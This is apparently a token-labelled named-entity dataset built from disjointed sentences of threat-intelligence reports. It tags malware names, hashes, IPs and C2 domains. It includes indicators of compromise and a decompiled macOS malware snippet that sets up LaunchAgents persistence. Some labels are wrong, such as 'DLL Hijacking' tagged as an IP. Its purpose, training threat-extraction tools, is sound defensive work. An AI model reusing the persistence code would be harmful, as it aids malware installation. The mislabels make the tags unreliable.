may	O
be	O
unlawful	O
.	O

recID	O
:	O
11173­01­PRS	O
WIDESTR	O

Sofacy	O
,	O
also	O
known	O
as	O
APT28	O
,	O
Fancy	O
Bear	O
,	O
and	O
Tsar	O
Team	O
,	O
is	O
a	O
highly	O
active	O
and	O
prolific	O
APT	O
.	O

The	O
victim	O
is	O
then	O
shown	O
either	O
a	O
YouTube	O
video	O
featuring	O
Sheikh	O
Adnan	O
al-Arour	O
,	O
or	O
a	O
story	O
on	O
http://www.alkalimaonline.com	O
,	O
a	O
Lebanese	O
news	O
site	O
.	O

To	O
our	O
analysts	O
,	O
this	O
was	O
a	O
rare	O
opportunity	O
.	O

Hotwire	O
pour	O
Kaspersky	O
Lab	O

Figure	O
13	O
.	O

The	O
ransomware	O
then	O
enumerates	O
both	O
local	O
and	O
network	O
resources	O
,	O
and	O
encrypts	O
files	O
using	O
2,048-bit	O
RSA	O
algorithm	O
.	O

GetString	O
(	O
System	O
.	O

Example/Explanation	O

A	O
handful	O
of	O
visits	O
to	O
a	O
specific	O
url	O
on	O
the	O
server	O
from	O
five	O
systems	O
based	O
in	O
the	O
following	O
locations	O
were	O
recorded	O
on	O
the	O
8th	O
and	O
9th	O
.	O

Aurora	B-malware.infosteal
coverage	O
in	O
McAfee	O
point	O
products	O
:	O
Exploit-Comele	O
Trojan	O

We	O
see	O
that	O
there	O
are	O
two	O
locations	O
where	O
DecryptCommandBuffer_sub_44C628	O
(	O
)	O
is	O
called	O
,	O
and	O
one	O
of	O
those	O
locations	O
,	O
EncryptData_sub_49D9EC	O
(	O
)	O
,	O
has	O
a	O
hard-coded	O
string	O
with	O
an	O
uncanny	O
resemblance	O
to	O
a	O
decryption	O
key	O
:	O

Fidelis	O
researchers	O
surmised	O
there	O
might	O
be	O
a	O
means	O
of	O
recovering	O
file	O
data	O
from	O
targeted	O
systems	O
from	O
a	O
forensic	O
and	O
investigative	O
analysis	O
point	O
of	O
view	O
.	O

According	O
to	O
our	O
analysis	O
,	O
jmidebs.sys	O
is	O
the	O
connecting	O
link	O
between	O
mrxcls.sys	O
and	O
the	O
drivers	O
later	O
used	O
in	O
Duqu	B-malware.infosteal
.	O

Their	O
malware	O
's	O
resemblance	O
to	O
that	O
of	O
Patchwork	O
's	O
is	O
also	O
notable	O
.	O

Detailed	O
behaviour	O
observed	O
in	O
each	O
phase	O
will	O
be	O
explained	O
in	O
the	O
next	O
section	O
.	O

The	O
flyer	O
also	O
reveals	O
the	O
price	O
of	O
the	O
malware	O
:	O
The	O
basic	O
binary	O
costs	O
$	O
320	O
and	O
each	O
plugin	O
must	O
be	O
paid	O
for	O
separately	O
,	O
for	O
example	O
$	O
50	O
for	O
the	O
file	O
stealer	O
,	O
$	O
60	O
for	O
the	O
ad-clicker	O
and	O
up	O
to	O
$	O
350	O
for	O
a	O
configurable	O
form	O
grabber	O
.	O

Russia	O
accounted	O
for	O
the	O
largest	O
number	O
of	O
attacks	O
between	O
2015	O
and	O
2017	O
,	O
followed	O
by	O
Ukraine	O
,	O
Moldova	O
,	O
Belgium	O
,	O
Iran	O
,	O
and	O
France	O
.	O

Morgan	O
Marquis-Boire	O
is	O
a	O
Technical	O
Advisor	O
at	O
the	O
Citizen	O
Lab	O
,	O
Munk	O
School	O
of	O
Global	O
Affairs	O
,	O
University	O
of	O
Toronto	O
.	O

The	O
HTTP	O
File	O
Server	O

Packet	O
capture	O
on	O
port	O
1321/tcp	O
:	O

Thu	O
Jun	O
14	O
2012	O
12:55:12	O
285691	O
mac	O
.	O

Malware	O
sandboxes	O
are	O
automated	O
dynamic	O
analysis	O
systems	O
that	O
execute	O
programs	O
in	O
a	O
controlled	O
environment	O
.	O

www[.]nasnnones[.]com	O
trems[.]rvenee[.]com	O
contacts[.]rvenee[.]com	O
91[.]207[.]7[.]91	O
89[.]18[.]27[.]159	O
89[.]37[.]226[.]108	O
185[.]25[.]51[.]116	O
185[.]81[.]113[.]95	O
185[.]144[.]83[.]82	O
185[.]153[.]198[.]58	O
185[.]159[.]129[.]226	O

Evidence	O
suggests	O
that	O
these	O
groups	O
include	O
those	O
behind	O
the	O
recent	O
Forbes	O
and	O
Anthem	O
attacks	O
.	O

It	O
should	O
be	O
noticed	O
that	O
ramFS	O
is	O
also	O
present	O
in	O
other	O
Animal	O
Farm	O
binaries	O
(	O
see	O
attribution	O
paragraph	O
below	O
)	O
,	O
but	O
since	O
we	O
are	O
unaware	O
of	O
previous	O
analysis	O
of	O
ramFS	O
,	O
we	O
are	O
describing	O
our	O
findings	O
here	O
.	O

The	O
malware	O
is	O
also	O
very	O
sneaky	O
and	O
sensitive	O
to	O
dynamic	O
analysis	O
.	O

system	O
(	O
'	O
mkdir	O
-p	O
/Users/Shared/.local/	O
&	O
>	O
/dev/null	O
'	O
)	O
;	O
system	O
(	O
'	O
mkdir	O
-p	O
~/Library/LaunchAgents/	O
&	O
>	O
/dev/null	O
'	O
)	O
;	O
off_10001B4F0	O
(	O
v5	O
,	O
&	O
off_10001B4F0	O
,	O
CFSTR	O
(	O
'	O
/Users/Shared/.local/kextd	O
'	O
)	O
,	O
1LL	O
)	O
;	O
off_10001B4F0	O
(	O
v6	O
,	O
&	O
off_10001B4F0	O
,	O
CFSTR	O
(	O
'	O
/Users/Shared/com.apple.updates.plist	O
'	O
)	O
,	O
1LL	O
)	O
;	O
off_10001B4F0	O
(	O
v7	O
,	O
&	O
off_10001B4F0	O
,	O
CFSTR	O
(	O
'	O
/Users/Shared/start.sh	O
'	O
)	O
,	O
1LL	O
)	O
;	O
system	O
(	O
'	O
cp	O
/Users/Shared/com.apple.updates.plist	O
$	O
HOME/Library/LaunchAgents/	O
&	O
>	O
/dev/null	O
'	O
)	O
;	O
remove	O
(	O
'	O
/Users/Shared/com.apple.updates.plist	O
'	O
)	O
;	O
system	O
(	O
'	O
chmod	O
755	O
/Users/Shared/.local/kextd	O
'	O
)	O
;	O
system	O
(	O
'	O
chmod	O
755	O
/Users/Shared/start.sh	O
'	O
)	O
;	O

[	O
그림	O
11	O
]	O
Ghostrat의	B-malware.backdoor
특징적인	O
문자열	O
[	O
그림	O
12	O
]	O
는	O
안다리엘	O
그룹이	O
한글화하여	O
사용한	O
중국	O
공격	O
도구들이다	O
.	O

return	O
re	O
sult	O
;	O
23	O
}	O
!	O

#	O
getdrivelist	O
?	O

WhiteBear	O
code	O
and	O
strings	O

All	O
rights	O
reserved	O
.	O

RATANKBA	B-malware.backdoor
is	O
delivered	O
to	O
its	O
victims	O
using	O
a	O
variety	O
of	O
lure	O
documents	O
,	O
including	O
Microsoft	O
Office	O
documents	O
,	O
malicious	O
CHM	O
files	O
,	O
and	O
different	O
script	O
downloaders	O
.	O

1B7D8D3BBF14C6B619480C265C2F4664F9DCB878EA7DFC6F2637	O

A	O
zero-day	O
vulnerability	O
is	O
a	O
vulnerability	O
for	O
which	O
there	O
exists	O
no	O
patch	O
,	O
whereas	O
an	O
'	O
N-Day	B-malware.unknown
'	O
vulnerability	O
is	O
an	O
attack	O
that	O
takes	O
place	O
'	O
N	O
'	O
days	O
after	O
the	O
patch	O
is	O
available	O
.	O

The	O
document	O
opens	O
and	O
appears	O
as	O
such	O
:	O

During	O
our	O
investigation	O
we	O
found	O
that	O
the	O
majority	O
of	O
XtremeRAT	B-malware.backdoor
activity	O
is	O
associated	O
with	O
spam	O
campaigns	O
that	O
typically	O
distribute	O
Zeus	B-malware.infosteal
variants	I-malware.infosteal
and	O
other	O
banking-focused	O
malware	O
.	O

These	O
exploits	O
are	O
at	O
the	O
core	O
payload	O
of	O
any	O
advanced	O
malware	O
,	O
and	O
are	O
virtually	O
unstoppable	O
until	O
vendors	O
release	O
a	O
patch	O
or	O
anti-virus	O
providers	O
come	O
up	O
with	O
a	O
signature	O
definition	O
.	O

Filename	O
:	O
main.dll	O

These	O
include	O
Trend	O
Micro	O
endpoint	O
solutions	O
such	O
as	O
Trend	O
MicroTM	O
Smart	O
Protection	O
Suites	O
and	O
Worry-FreeTM	O
Business	O
Security	O
,	O
which	O
can	O
protect	O
users	O
and	O
businesses	O
from	O
these	O
threats	O
by	O
detecting	O
malicious	O
files	O
,	O
well	O
as	O
blocking	O
all	O
related	O
malicious	O
URLs	O
.	O

Interesting	O
again	O
,	O
same	O
as	O
during	O
infection	O
,	O
the	O
regsvr32.exe	O
process	O
remains	O
running	O
even	O
after	O
Babar	B-malware.drop
is	O
readily	O
set	O
up	O
.	O

Graphic	O
used	O
by	O
the	O
malicious	O
document	O

The	O
downloader	O
may	O
contain	O
an	O
encoded	O
executable	O
file	O
of	O
Process	O
Hacker	O
(	O
a	O
multi-function	O
task	O
manager	O
)	O
,	O
and	O
it	O
may	O
execute	O
the	O
Process	O
Hacker	O
if	O
an	O
anti-virus	O
software	O
is	O
detected	O
.	O

Determined	O
the	O
system	O
architecture	O
to	O
select	O
the	O
correct	O
path	O
for	O
PowerShell	O
2	O
.	O

OceanLotus	O
continues	O
its	O
activity	O
particularly	O
targeting	O
company	O
and	O
government	O
networks	O
in	O
East-Asian	O
countries	O
.	O

darkcomet.py	B-malware.backdoor
Crypto	O
Module	O

For	O
example	O
,	O
the	O
string	O
at	O
the	O
relative	O
virtual	O
address	O
(	O
RVA	O
)	O
0x10001630	O
is	O
loaded	O
and	O
then	O
XOR	O
'd	O
with	O
key	O
0x0d	O
to	O
reveal	O
the	O
following	O
User-agent	O
string	O
in	O
Unicode	O
format	O
:	O
Similar	O
activity	O
also	O
occurs	O
at	O
RVA	O
0x10000179F	O
where	O
the	O
string	O
is	O
XOR	O
'd	O
with	O
key	O
0x14	O
to	O
reveal	O
the	O
following	O
static	O
string	O
observed	O
in	O
the	O
beacon	O
to	O
the	O
C2	O
:	O
1a53b0cp32e46g0qio9	O
The	O
code	O
for	O
that	O
procedure	O
is	O
below	O
:	O
While	O
this	O
string	O
stacking	O
technique	O
is	O
very	O
common	O
within	O
shellcode	O
,	O
it	O
is	O
less	O
frequently	O
used	O
with	O
Unicode	O
strings	O
because	O
Unicode	O
strings	O
are	O
two	O
bytes	O
in	O
length	O
for	O
every	O
character	O
,	O
as	O
compared	O
to	O
one-byte	O
length	O
for	O
ASCII	O
characters	O
.	O

This	O
time	O
,	O
a	O
loop	O
is	O
implemented	O
with	O
a	O
call	O
to	O
sleep	O
for	O
a	O
short	O
time	O
.	O

Our	O
findings	O
highlight	O
the	O
increasing	O
dissonance	O
between	O
Gamma	O
's	O
public	O
claims	O
that	O
FinSpy	B-malware.backdoor
is	O
used	O
exclusively	O
to	O
track	O
'	O
bad	O
guys	O
'	O
and	O
the	O
growing	O
body	O
of	O
evidence	O
suggesting	O
that	O
the	O
tool	O
has	O
and	O
continues	O
to	O
be	O
used	O
against	O
opposition	O
groups	O
and	O
human	O
rights	O
activists	O
.	O

Additionally	O
,	O
the	O
domains	O
adobeair.net	B-url.unknown
and	O
bikefanclub.info	B-url.unknown
both	O
resided	O
on	O
50.63.202.94	B-ip.unknown
from	O
2014-04-24	O
to	O
2014-04-25	O
.	O

These	O
belong	O
to	O
various	O
DynDNS	O
services	O
,	O
and	O
at	O
the	O
time	O
of	O
writing	O
resolve	O
to	O
IP	O
addresses	O
located	O
with	O
hosting	O
services	O
in	O
the	O
US	O
.	O

The	O
threat	O
actors	O
are	O
not	O
likely	O
native	O
English	O
speakers	O
since	O
multiple	O
typos	O
were	O
found	O
in	O
their	O
payloads	O
.	O

573ef0b7ff1dab2c3f785ee46c51a54f	B-hash
SHA-1	O
d58d4f6ad3235610bafba677b762f3872b0f67cb	B-hash
SHA-256	O
363172a2f2b228c7b00b614178e4ffa00a3a124200ceef4e6d7edb25a4696345	B-hash

The	O
implementation	O
is	O
not	O
exactly	O
the	O
same	O
nor	O
is	O
the	O
log	O
of	O
media	O
infection	O
;	O
Version	O
1.5	O
creates	O
a	O
new	O
event	O
:	O
'	O
wowmgr_is_load	O
'	O
.	O

This	O
could	O
allow	O
an	O
attacker	O
to	O
alter	O
a	O
controlled	O
process	O
unbeknownst	O
to	O
process	O
operators	O
.	O

Malware	O
also	O
supports	O
second	O
type	O
of	O
download	O
functionality	O
,	O
instead	O
of	O
extracting	O
the	O
URL	O
from	O
the	O
C2	O
response	O
and	O
downloading	O
the	O
executable	O
,	O
it	O
gets	O
executable	O
content	O
from	O
the	O
networks	O
stream	O
from	O
a	O
hard	O
coded	O
IP	O
address	O
and	O
then	O
writes	O
it	O
to	O
the	O
disk	O
and	O
executes	O
it	O
.	O

Summary	O
of	O
the	O
changes	O
between	O
each	O
version	O
of	O
ANEL	B-malware.backdoor

%	O
localappdata%\Temp\chrome.crx	O

Yet	O
I	O
recently	O
uncovered	O
evidence	O
that	O
suggests	O
it	O
was	O
the	O
work	O
of	O
a	O
well-known	O
Chinese	O
threat	O
group	O
.	O

The	O
main	O
downloader	O
is	O
extracted	O
from	O
the	O
decoy	O
document	O
via	O
a	O
malicious	O
VB	O
script	O
that	O
runs	O
it	O
from	O
the	O
temp	O
folder	O
.	O

77.69.181.162	B-ip.unknown
Batelco	O
ADSL	O
Service	O
Australia	O
Bahrain	O
180.211.xxx.xxx	B-ip.unknown
Telegraph	O
&	O
Telephone	O
Board	O
Bangladesh	O
168.144.xxx.xxx	B-ip.unknown
Softcom	O
,	O
Inc	O
.	O

CTU	O
researchers	O
identified	O
the	O
owners	O
of	O
three	O
of	O
these	O
accounts	O
;	O
two	O
belonged	O
to	O
the	O
DNC	O
's	O
secretary	O
emeritus	O
,	O
and	O
one	O
belonged	O
to	O
the	O
communications	O
director	O
.	O

AV	O
detection	O

The	O
latter	O
was	O
redirecting	O
to	O
journey-in-israel[.]com	O
and	O
iec-co-il[.]com	O
in	O
May	O
and	O
July	O
2016	O
,	O
according	O
to	O
PassiveTotal	O
:	O
Sample	O
24befa319fd96dea587f82eb945f5d2a	B-hash
,	O
potentially	O
only	O
a	O
test	O
file	O
,	O
is	O
a	O
self-extracting	O
archive	O
(	O
SFX	O
)	O
that	O
contains	O
two	O
files	O
:	O
a	O
legitimate	O
Putty	O
installation	O
and	O
link.html	O
:	O

Operation	B-malware.backdoor
Erebus	I-malware.backdoor
leverages	O
another	O
Flash	O
Player	O
exploit	O
(	O
CVE-2016-4117	O
)	O
through	O
the	O
use	O
of	O
watering	B-malware.backdoor
hole	I-malware.backdoor
attacks	O
.	O

In	O
addition	O
to	O
installing	O
the	O
legitimate	O
version	O
of	O
WinRAR	O
,	O
the	O
dropper	O
installed	O
the	O
following	O
StrongPity	O
components	O
:	O
%	O
temp%\procexp.exe	O
%	O
temp	O
%	O
\sega\	O
nvvscv.exe	O
prst.cab	O
prst.dll	O
wndplyr.exe	O
wrlck.cab	O
wrlck.dll	O
Of	O
these	O
files	O
,	O
two	O
are	O
configurable	O
and	O
encrypted	O
with	O
the	O
same	O
keyless	O
cipher	O
,	O
'	O
wrlck.cab	O
'	O
and	O
'	O
prst.cab	O
'	O
.	O

The	O
table	O
below	O
lists	O
its	O
possible	O
commands	O
:	O

Instead	O
of	O
showing	O
information	O
interesting	O
for	O
an	O
Israeli	O
audience	O
,	O
the	O
video	O
contains	O
a	O
music	O
piece	O
critical	O
of	O
Mahmoud	O
Abbas	O
,	O
claiming	O
that	O
he	O
is	O
not	O
working	O
for	O
the	O
good	O
of	O
the	O
Palestinian	O
people	O
.	O

Furthermore	O
,	O
this	O
domain	O
is	O
not	O
a	O
publicly	O
available	O
dynamic	O
DNS	O
provider	O
and	O
the	O
email	O
address	O
used	O
to	O
register	O
this	O
domain	O
is	O
.	O

The	O
port	O
number	O
is	O
sent	O
to	O
the	O
driver	O
(	O
via	O
IOCTL	O
0x220200	O
)	O
in	O
order	O
to	O
inform	O
the	O
driver	O
where	O
to	O
redirect	O
incoming	O
traffic	O
.	O

The	O
spoofed	O
source	O
of	O
this	O
email	O
suggests	O
the	O
message	O
is	O
legitimate	O
and	O
increases	O
the	O
chances	O
that	O
victims	O
will	O
treat	O
it	O
as	O
such	O
.	O

Cisco	O
analyzes	O
a	O
massive	O
amount	O
of	O
telemetry	O
data	O
and	O
is	O
able	O
to	O
 ag	O
malware	O
as	O
malicious	O
based	O
on	O
multiple	O
factors	O
.	O

South	O
Korea	O
is	O
more	O
at	O
risk	O
now	O
than	O
before	O
the	O
attack	O
,	O
as	O
now	O
adversaries	O
less	O
capable	O
than	O
advanced	O
persistent	O
threats	O
realize	O
they	O
could	O
also	O
successfully	O
perform	O
damaging	O
attacks	O
.	O

The	O
copy	O
of	O
Freegate	B-malware.infosteal
launched	O
is	O
listed	O
as	O
'	O
Freegate	B-malware.infosteal
7.35	O
Professional	O
Edition	O
.	O
'	O

Additional	O
reverse	O
engineering	O
and	O
analysis	O
is	O
on-­‐going	O
at	O
this	O
time	O
.	O

We	O
do	O
not	O
believe	O
either	O
Moafee	B-malware.infosteal
or	O
DragonOK	B-malware.infosteal
have	O
controlled	O
the	O
domain	O
'	O
ct.datangcun[.]	O

HKCR\mscfile\shell\open\command	O
.	O

The	O
dwPktType	O
field	O
correlates	O
to	O
the	O
module	O
ID	O
which	O
allows	O
the	O
server	O
variant	O
to	O
route	O
the	O
datagram	O
to	O
the	O
appropriate	O
module	O
without	O
further	O
inspection	O
of	O
the	O
payload	O
data	O
.	O

**Nobody	O
paid	O
so	O
they	O
decreased	O
ransom	O
to	O
0.05	O
BTC	O

NALYSIS	O
ON	O
MODULE	O
3	O
.............................................................................................................................................	O
6	O

The	O
backdoors	O
were	O
also	O
similarly	O
signed	O
using	O
the	O
same	O
stolen	O
code-signing	O
certificate	O
from	O
'	O
HT	O
Srl	O
.	O
'	O

Even	O
after	O
it	O
has	O
reportedly	O
stolen	O
hundreds	O
of	O
millions	O
of	O
dollars	O
,	O
the	O
infamous	O
Carbanak	B-malware.infosteal
APT	O
group	O
is	O
n't	O
resting	O
on	O
its	O
laurels	O
.	O

Exploit	O
:	O

There	O
was	O
overlap	O
between	O
this	O
large	O
cluster	O
and	O
the	O
second	O
largest	O
one	O
which	O
used	O
the	O
password	O
'	O
123456	O
'	O
(	O
12	O
samples	O
)	O
.	O

Figure	O
1	O
is	O
a	O
screenshot	O
of	O
a	O
packet	O
capture	O
showing	O
one	O
of	O
the	O
RTF	O
files	O
reaching	O
out	O
to	O
hxxp://tk-in-f156.2bunny[.]com/Agreement.doc	B-url.unknown
.	O

Obfuscated	O
control	O
servers	O
.	O

This	O
is	O
normally	O
located	O
in	O
the	O
folder	O
.	O

We	O
've	O
seen	O
file	O
exfiltration	O
,	O
remote	O
command	O
execution	O
capability	O
and	O
anti-vm	O
techniques	O
added	O
throughout	O
the	O
life	O
of	O
GravityRAT	B-malware.drop
.	O

The	O
fi	O
rst	O
stage	O
payload	O
–	O
'	O
UP	O
'	O

The	O
latest	O
CozyDuke	B-malware.drop
main	O
component	O
we	O
observed	O
was	O
compiled	O
on	O
the	O
26	O
of	O
February	O
,	O
2015	O
.	O

Earlier	O
attempts	O
used	O
EXE	O
's	O
disguised	O
with	O
Microsoft	O
Word	O
document	O
icons	O
and	O
DOCX	O
files	O
within	O
a	O
similarly	O
named	O
ZIP	O
file	O
as	O
documented	O
by	O
JPCERT	O
.	O

.SYSTEM\CurrentControlSet\Services\360rp	O

Also	O
,	O
Trojan.PonyDOS	B-malware.unknown
does	O
not	O
go	O
to	O
the	O
trouble	O
of	O
converting	O
its	O
encrypted	O
data	O
payloads	O
into	O
ASCII	O
representations	O
as	O
DarkComet	B-malware.backdoor
does	O
.	O

Figure	O
4	O

When	O
the	O
victim	O
opens	O
the	O
excel	O
file	O
and	O
enables	O
the	O
macro	O
content	O
,	O
The	O
malicious	O
macro	O
code	O
within	O
the	O
excel	O
file	O
is	O
executed	O
.	O

In	O
tweets	O
to	O
international	O
journalists	O
and	O
Twitter	O
accounts	O
that	O
disseminate	O
hacktivist	O
and	O
information	O
security	O
news	O
,	O
'	O
Fancy	O
Bears	O
'	O
Hack	O
Team	O
'	O
claims	O
to	O
have	O
'	O
proof	O
of	O
American	O
athletes	O
taking	O
doping	O
.	O
'	O

It	O
is	O
not	O
a	O
secret	O
that	O
anti-malware	O
systems	O
trigger	O
on	O
special	O
system	O
functions	O
that	O
are	O
called	O
in	O
the	O
context	O
of	O
potential	O
vulnerable	O
applications	O
to	O
make	O
a	O
deeper	O
analysis	O
of	O
API	O
calls	O
such	O
as	O
CreateProcess	O
,	O
WinExec	O
or	O
ShellExecute	O
.	O

Long-term	O
access	O
to	O
email	O
accounts	O
of	O
senior	O
campaign	O
advisors	O
,	O
who	O
may	O
be	O
appointed	O
to	O
staff	O
positions	O
in	O
a	O
Clinton	O
administration	O
,	O
could	O
provide	O
TG-4127	B-malware.infosteal
and	O
the	O
Russian	O
government	O
with	O
access	O
to	O
those	O
individual	O
's	O
accounts	O
.	O

By	O
late	O
December	O
2014	O
,	O
the	O
total	O
number	O
of	O
Russian	O
forces	O
in	O
the	O
region	O
was	O
approximately	O
10,000	O
troops	O
.	O

[	O
그림	O
5	O
]	O
다운로드된	O
파일	O
(	O
위	O
)	O
과	O
5바이트	O
복구된	O
파일	O
(	O
아래	O
)	O
일정	O
규모	O
이상의	O
기관	O
및	O
기업에서는	O
대부분	O
PC	O
등	O
조직	O
내	O
다수의	O
시스템을	O
중앙관리	O
솔루션에	O
연결하	O
여	O
관리한다	O
.	O

The	O
code	O
was	O
largely	O
trivial	O
to	O
reverse	O
engineer	O
,	O
which	O
meant	O
static	O
analysis	O
was	O
an	O
easy	O
option	O
for	O
this	O
piece	O
of	O
malware	O
.	O

The	O
above	O
PowerShell	O
command	O
downloads	O
a	O
file	O
from	O
the	O
specified	O
URL	O
,	O
and	O
it	O
is	O
saved	O
as	O
a	O
batch	O
file	O
to	O
be	O
executed	O
.	O

Even	O
though	O
the	O
MD5s	O
are	O
useful	O
,	O
this	O
is	O
a	O
text-based	O
payload	O
that	O
can	O
be	O
easily	O
changed	O
,	O
resulting	O
in	O
a	O
new	O
MD5	O
hash	O
.	O

theme0.xml	O
is	O
a	O
Mach-O	O
32-bit	O
executable	O
with	O
a	O
0xFEEDFACE	O
signature	O
that	O
is	O
also	O
the	O
dropper	O
of	O
the	O
backdoor	O
,	O
which	O
is	O
the	O
final	O
payload	O
.	O

At	O
points	O
E.	O
and	O
F.	O
you	O
can	O
see	O
the	O
malware	O
checking	O
in	O
with	O
the	O
command	O
and	O
control	O
server	O
.	O

These	O
three	O
files	O
work	O
together	O
using	O
a	O
common	O
technique	O
call	O
DLL	O
Side-Loading	O
or	O
DLL	O
Hijacking	B-ip.unknown
.	O

Before	O
that	O
date	O
,	O
the	O
IP	O
was	O
200.63.46.33	O

?	O
1	O
?	O
0	O
8d	O
44	O
24	O
?	O
c	O
66	O
8b	O
10	O
66	O
3b	O
11	O
75	O
1e	O
66	O
85	O
d2	O
74	O
15	O
66	O
8b	O
50	O
02	O
66	O
3b	O
51	O
02	O
75	O
0f	O
83	O
c0	O
04	O
83	O
c1	O
04	O
66	O
85	O
d2	O
75	O
de	O
33	O
c0	O
eb	O
05	O
1b	O
c0	O
83	O
d8	O
ff	O
85	O
c0	O
0f	O
84	O
?	O
?	O

Compared	O
to	O
incidents	O
like	O
Uroburos	B-malware.backdoor
,	O
the	O
Kraken	B-malware.ransom
malware	O
is	O
not	O
good	O
enough	O
to	O
'	O
catch	O
the	O
big	O
fish	O
'	O
if	O
we	O
want	O
to	O
stick	O
with	O
to	O
the	O
metaphor	O
.	O

iconfig.exe	O
bbs.winupdate[.]net	B-url.cncsvr
|	O
Port	O
8080	O
Dynamic	O

However	O
,	O
there	O
may	O
be	O
some	O
other	O
versions	O
with	O
different	O
functions	O
.	O

lstrcmpA	O
(	O
&	O
>	O
command	O
,	O
'	O
pwd	O
'	O
)	O
)	O

The	O
table	O
also	O
includes	O
the	O
md5sum	O
of	O
the	O
malware	O
payloads	O
.	O

For	O
Telegram	O
:	O

Someone	O
using	O
the	O
language	O
code	O
as	O
a	O
false	O
flag	O
would	O
have	O
likely	O
kept	O
the	O
strategy	O
going	O
.	O

Interestingly	O
,	O
the	O
Babar	B-malware.drop
dropper	O
as	O
well	O
as	O
the	O
implant	O
show	O
a	O
similar	O
method	O
of	O
API	O
name	O
obfuscation	O
as	O
the	O
Bunny	B-malware.unknown
malware	O
and	O
samples	O
from	O
the	O
NBOT	B-malware.unknown
family	O
.	O

Some	O
targets	O
are	O
spearphished	O
repeatedly	O
with	O
much	O
the	O
same	O
social-engineering	O
schemes	O
.	O

0x406EA8	O
:	O
FF150C10AF01	O
CALL	O
DWORD	O
PTR	O
[	O
0x1AF100C	O
]	O

Out	O
of	O
scope	O
for	O
prior	O
versions	O
.	O

domain	O
domain	O
domain	O
domain	O
sender	O
sender	O
sender	O

Interestingly	O
,	O
the	O
configuration	O
file	O
also	O
specifies	O
a	O
Vietnamese	O
phone	O
number	O
used	O
for	O
SMS	O
based	O
command	O
and	O
control	O
:	O
Section	O
Type	O
:	O
TlvTypeConfigSMSPhoneNumber	O
Section	O
Data	O
:	O
'	O
+841257725403	O
'	O
The	O
command	O
and	O
control	O
server	O
is	O
in	O
a	O
range	O
provided	O
by	O
the	O
CMC	O
Telecom	O
Infrastructure	O
Company	O
in	O
Hanoi	O
:	O
IP	O
Address	O
:	O
183.91.2.199	O
inetnum	O
:	O
183.91.0.0	O
–	O
183.91.9.255	O
netname	O
:	O
FTTX-NET	O
country	O
:	O
Vietnam	O
address	O
:	O
CMC	O
Telecom	O
Infrastructure	O
Company	O
address	O
:	O
Tang	O
3	O
,	O
16	O
Lieu	O
Giai	O
str	O
,	O
Ba	O
Dinh	O
,	O
Ha	O
Noi	O
This	O
server	O
was	O
active	O
until	O
very	O
recently	O
and	O
matched	O
our	O
signatures	O
for	O
a	O
FinSpy	B-malware.backdoor
command	O
and	O
control	O
server	O
.	O

Obfuscating	O
code	O
and	O
signaling	O
to	O
the	O
C2	O
that	O
the	O
file	O
has	O
been	O
executed	O
Launching	O
the	O
loader	O
and	O
using	O
it	O
to	O
execute	O
functions	O
.	O

In	O
this	O
scenario	O
,	O
accevent.exe	O
is	O
the	O
primary	O
executable	O
,	O
which	O
is	O
usually	O
legitimate	O
.	O

One	O
is	O
a	O
malicious	O
installer	O
of	O
the	O
circumvention	O
tool	O
Freegate	B-malware.infosteal
.	O

The	O
timing	O
is	O
interesting	O
because	O
the	O
NCTC	O
was	O
in	O
the	O
process	O
of	O
conducting	O
physical	O
antiterror	O
drills	O
in	O
the	O
region	O
in	O
preparation	O
for	O
the	O
Olympic	O
Games	O
.	O

Once	O
it	O
is	O
decrypted	O
,	O
we	O
are	O
able	O
to	O
extract	O
the	O
plaintext	O
configuration	O
information	O
including	O
the	O
domain	O
of	O
the	O
command	O
and	O
control	O
server	O
and	O
port	O
number	O
(	O
Fig	O
8	O
)	O
.	O

Trend	O
Micro	O
OfficeScan	O
Antivirus	O
real-time	O
scan	O
monitor	O
Trend	O
Micro	O
OfficeScan	O
NT	O
Listener	O
Trend	O
Micro	O
OfficeScan	O
NT	O
Firewall	O
Next	O
,	O
the	O
process	O
attempts	O
to	O
find	O
an	O
embedded	O
'	O
IMAGE	O
'	O
resource	O
with	O
offset	O
#	O
110	O
.	O

In	O
most	O
cases	O
,	O
they	O
logged	O
on	O
to	O
the	O
server	O
at	O
roughly	O
the	O
same	O
time	O
of	O
day	O
,	O
probably	O
in	O
the	O
morning	O
hours	O
:	O

In	O
2015	O
we	O
noticed	O
another	O
wave	O
of	O
attacks	O
which	O
took	O
advantage	O
of	O
a	O
new	O
release	O
of	O
the	O
AZZY	B-malware.backdoor
implant	O
,	O
largely	O
undetected	O
by	O
antivirus	O
products	O
.	O

Upon	O
execution	O
malware	O
makes	O
a	O
connection	O
to	O
the	O
c2	O
server	O
on	O
port	O
5555	O
and	O
sends	O
the	O
system	O
&	O
operating	O
system	O
information	O
along	O
with	O
some	O
base64	O
encoded	O
strings	O
to	O
the	O
attacker	O
as	O
shown	O
below	O
.	O

In	O
this	O
way	O
,	O
individual	O
threat	O
actors	O
can	O
be	O
tracked	O
with	O
Digital	O
DNATM	O
.	O

zxMain	O
is	O
obtained	O
with	O
GetProcAddress	O
.	O

The	O

Where	O
the	O
site	O
was	O
referenced	O
via	O
phishing	O
as	O
opposed	O
to	O
'	O
Watering	O
Hole	O
'	O
based	O
activity	O
,	O
it	O
has	O
been	O
excluded	O
from	O
the	O
following	O
table	O
.	O

Therefore	O
,	O
the	O
array	O
can	O
be	O
read	O
and	O
written	O
at	O
any	O
address	O
.	O

-	O
exact	O
functionality	O
unknown	O
appears	O
to	O
force	O
another	O
request	O
to	O
the	O
C2	O
page	O
check.asp	O

We	O
have	O
the	O
impression	O
that	O
a	O
cybersurveillance	O
operation	O
is	O
underway	O
(	O
and	O
is	O
probably	O
still	O
ongoing	O
-	O
most	O
recent	O
sample	O
created	O
Oct	O
.	O

Since	O
the	O
RAT	B-malware.backdoor
library	O
was	O
built	O
to	O
run	O
from	O
the	O
memory	O
of	O
a	O
host	O
process	O
,	O
it	O
relies	O
on	O
the	O
loader	O
to	O
survive	O
system	O
restart	O
.	O

As	O
previously	O
noted	O
,	O
root9B	O
is	O
in	O
the	O
process	O
of	O
further	O
documenting	O
and	O
reporting	O
probable	O
fictitious	O
personas	O
to	O
the	O
authorities	O
.	O

Both	O
the	O
command	O
&	O
control	O
server	O
IP	O
and	O
the	O
phone	O
number	O
used	O
for	O
text-message	O
exfiltration	O
are	O
in	O
Vietnam	O
which	O
indicates	O
a	O
domestic	O
campaign	O
.	O

Figure	O
4	O
.	O

Aug	O
27th	O
2012	O

Taking	O
into	O
account	O
the	O
profiles	O
of	O
the	O
targeted	O
organizations	O
--	O
South	O
Korean	O
universities	O
that	O
conduct	O
researches	O
on	O
international	O
affairs	O
,	O
produce	O
defense	O
policies	O
for	O
government	O
